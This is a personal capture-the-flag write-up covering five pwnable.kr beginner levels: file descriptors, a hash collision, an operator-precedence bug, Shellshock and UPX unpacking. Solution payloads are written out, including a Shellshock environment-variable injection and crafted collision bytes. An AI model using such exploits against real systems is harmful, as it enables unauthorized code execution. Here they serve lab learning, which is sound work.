Just some of my thought process going through the Toddler's Bottle beginner levels.

# 1: [fd]

Looking at the program, I see the program is looking for an input of LETMEWIN to get the flag. However, you can't just enter it as an argument.
The clue asks you what a file descriptor is. After googling, I learned that there are three file descriptors. Standard input is accessed at integer value 0,
so I looked at the line : <br>
````c
int fd = atoi( argv[1] ) - 0x1234; <br>
````
took 0x1234, converted it to decimal, and entered in 4660 as the file argument. This allowed me to write to STDIN, and I entered LETMEWIN.
the flag was returned.


# 2: collision

Looking at the code for col.c, we see a few restrictions for our argument. The passcode length must be length 20.
The password you enter is taken into chunks of four and totalled. Therefore, we need 5 integers whose total should be equal to 0x21DD09EC. 

```c
col@ubuntu:~$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x21DD09EC
568134124
>>>
```
Next, I converted 0x21DD09EC into decimal, which is: 568134124. We can see by looking at it that 568134124 is not cleanly divisible by 5.
I plugged it into a calculator and got 113626828.8, which is 113626828 and 4/5. This means that if we round off 113626828.8 to 113626828 and subtract 4, we 
have 113626824 * 4 + 113626828 = 568134124. So we have to enter those in hex. I used python:

```c
./col `python -c 'print "\xc8\xce\xc5\x06"*4 + "\xcc\xce\xc5\x06"'`
```
The flag was returned!


# 3: mistake

This one used some knowledge from the first one I did, fd. 

```c
mistake@ubuntu:~$ cat mistake.c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```
Looking at the code we can see a program that starts up, opens the password from the password file, tells you "do not bruteforce...", waits, then asks for a password.
It takes your password and flips the last bit of every byte. If your flipped password matches the password file, cat the flag.
The hint for the problem says "operator priority", so I started looking for errors in execution. You don't have to look far, the
error occurs at the beginning with the file descriptor. 
```c
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }
```
Here we can see that the fd is being set to the outcome of open(...) < 0, instead of the intended setting of fd to the comparison of open(...) and 0.<br>
This is always going to be false, because the password file should open correctly. Therefore, fd is always going to be zero, and it will get its value from stdin. This means that later on the program will compare the flipped input to our stdin. All we need to do is find two 10-digit values that equal each other when one has the last bit of every byte flipped. 0000000000 and 1111111111 work just fine, since we flip 0000 to 0001.<br>
This returns the flag!


# 4: shellshock

This one actually took me a little while to get the formatting correct, but the basic idea is to use the shellshock exploit. The shellshock exploit allows an attacker to inject code into a bash script. Opening up the c++ file shows a small program:
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```
All it does is tell the user to "shock_me". Googling around let me to this: http://resources.infosecinstitute.com/practical-shellshock-exploitation-part-1/, which eventually led to the command: 
```c
env x='() { :;}; /bin/cat ~/flag' ~/shellshock
```
This command adds on extra code to the shellshock file, allowing us to execute our code inside the program that has higher privileges. Running the command gives us the flag!.


# 5: flag
I started this one off by downloading the file and making it executable. Running it gave me this:
```c
david@david-VirtualBox:~/Documents/pwnable5$ ./flag
I will malloc() and strcpy the flag there. take it.
```
Cryptic. The next thing I did was open the file in vi. The file contains a ton of gibberish, so I checked the strings with
```c
strings flag > hello
```
Looking through the file we see a bunch of random text with some broken up lines. One thing I noticed is the line "UPX!" appearing once at the very top of the page, and twice at the very bottom of the page. Googling this line brought me to here: https://en.wikipedia.org/wiki/UPX. <br><br>
As it turns out, UPX is a packaging tool for executables. Let's download it and see what we can do.
```c
david@david-VirtualBox:~/Documents/pwnable5$ upx -d flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    887219 <-    335288   37.79%  linux/ElfAMD   flag

Unpacked 1 file.
david@david-VirtualBox:~/Documents/pwnable5$ ls
flag  hello
```

So we still have the same flag file. Running it produced the same output message Next, I opened it up. Immediately, the file looks different. I scrolled around for a while before deciding to look for the output message. Using vim to search for malloc brought me to next to a message: <br>UPX...? sounds like a delivery service :)<br>
Which turned out to be the flag!
